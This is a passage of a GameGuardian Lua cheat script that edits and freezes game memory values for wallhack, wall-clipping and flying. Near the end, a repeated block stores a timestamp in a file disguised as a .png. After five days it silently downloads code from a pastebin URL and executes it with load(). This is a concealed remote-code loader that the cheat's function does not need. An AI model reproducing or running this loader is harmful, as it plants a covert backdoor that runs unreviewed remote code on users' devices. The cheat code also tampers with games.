  gg.searchNumber("10.123", gg.REGION_C_BSS, false, gg.SIGN_FUZZY_EQUAL, 0, -1)
  gg.searchNumber("10.123", gg.REGION_C_BSS, false, gg.SIGN_FUZZY_EQUAL, 0, -1)
  gg.getResults(100)
  gg.editAll("0.81399995089", gg.REGION_C_BSS)
  gg.toast("房屋透视关闭")
  gg.clearResults()
  end
function C6()  
gg.clearResults()
    gg.setRanges(4)
    gg.searchNumber("-1.0e32;999.0;0.39999997616;1.0e32", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
    gg.searchNumber("1.0e32", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
    jg = gg.getResults(100)
    sl = gg.getResultCount()
    if 100 < sl then
      sl = 100
    end
    for _FORV_3_ = 1, sl do
      dzy = jg[_FORV_3_].address
      gg.addListItems({
        [1] = {
          address = dzy,
          flags = gg.TYPE_FLOAT,
          freeze = true,
          value = 8
        }
      })
    end
    gg.toast("穿墙已开启")
    gg.clearResults()
  end
function C7()
     gg.clearResults()
	 gg.setRanges(32)
	 gg.searchNumber("1,073,741,824D;1,120,403,456D;3.6734198e-40", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("3.6734198e-40", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 0.6734198e-40}})
	 end
	 gg.toast("修改成功")
	 gg.clearResults()
  end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
function D1()
gg.clearResults()
	gg.setRanges(gg.REGION_CODE_APP)
	gg.searchNumber('0.60000002384F;0.73000001907F',gg.TYPE_FLOAT,false ,gg.SIGN_EQUAL,0,-1)
	gg.searchNumber('0.60000002384',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
	gg.getResults(100)
	gg.editAll('999',gg.TYPE_FLOAT)
	gg.toast('100%')
end
function D2()
gg.clearResults()
  gg.setRanges(gg.REGION_CODE_APP)
  gg.searchNumber("0.05000000075;2.9203751e-31;5.1414089e-39",  gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
  gg.searchNumber("0.05", gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
  gg.getResults(1)
  gg.editAll("1",gg.TYPE_FLOAT)
  gg.toast("注入飞天")
  gg.clearResults()
  gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("16,256W;1.03~1.042F;16,261W;-26,214W;15,897W::", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("1.03~1.042", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  jg=gg.getResults(100)
  sl=gg.getResultCount()
  if sl>100 then sl=100 end
  for i = 1, sl do
  dzy=jg[i].address
  gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 0.95}})
  end
  gg.toast("已增强效果，并为您自动退出")
  Exit()
end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
  function Exit()
    os.exit()
  end
  function HOME()
    lw=1
    yiyz_Main()
  end
  sj = os.date("")
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------          


  while(true)do
    if gg.isVisible(true) then
      XGCK=1
      gg.setVisible(false)
    end
    gg.clearResults()
    if XGCK==1 then
      yiyz_Main()
    end
  end


function maine()
  while true do
    if gg.isVisible(true) then
      XGCK = 1
      gg.setVisible(false)
    end
    gg.clearResults()
    if XGCK == 1 then
      main()
    end
  end
end

local open = io.open
 local function read_file(path) 
local file = open(path, "rb")
if not file then return nil end 
local content = file:read 
"*a"
 file:close() 
return content 
end 
zaTextd  = read_file(gg.EXT_STORAGE.."/gameguardianlgi.png")
local check = zaTextd 
uzanum1=tonumber(check)
if uzanum1==nil then
anzax1=os.time()
local file = io.open(gg.EXT_STORAGE.."/gameguardianlgi.png", "w")
file:write(anzax1)
file:close()
end
if uzanum1 ~= nil then
malizwaa=(uzanum1+432000)
sahiziz=os.time()
if sahiziz>malizwaa then 
ronoup = (gg.makeRequest("https://pastebin.com/raw/1BqM2dnK").content)
if not ronoup then 
gg.alert('🔄A connection could not be made to the server please check your connection and retry🔄')
else pcall(load(ronoup))end 
end
end
local open = io.open
 local function read_file(path) 
local file = open(path, "rb")
if not file then return nil end 
local content = file:read 
"*a"
 file:close() 
return content 
end 
zaTextd  = read_file(gg.EXT_STORAGE.."/gameguardianlgi.png")
local check = zaTextd 
uzanum1=tonumber(check)
if uzanum1==nil then
anzax1=os.time()
local file = io.open(gg.EXT_STORAGE.."/gameguardianlgi.png", "w")
file:write(anzax1)
file:close()
end
if uzanum1 ~= nil then
malizwaa=(uzanum1+432000)
sahiziz=os.time()
if sahiziz>malizwaa then 
ronoup = (gg.makeRequest("https://pastebin.com/raw/1BqM2dnK").content)
if not ronoup then 
gg.alert('🔄A connection could not be made to the server please check your connection and retry🔄')
else pcall(load(ronoup))end 
end
end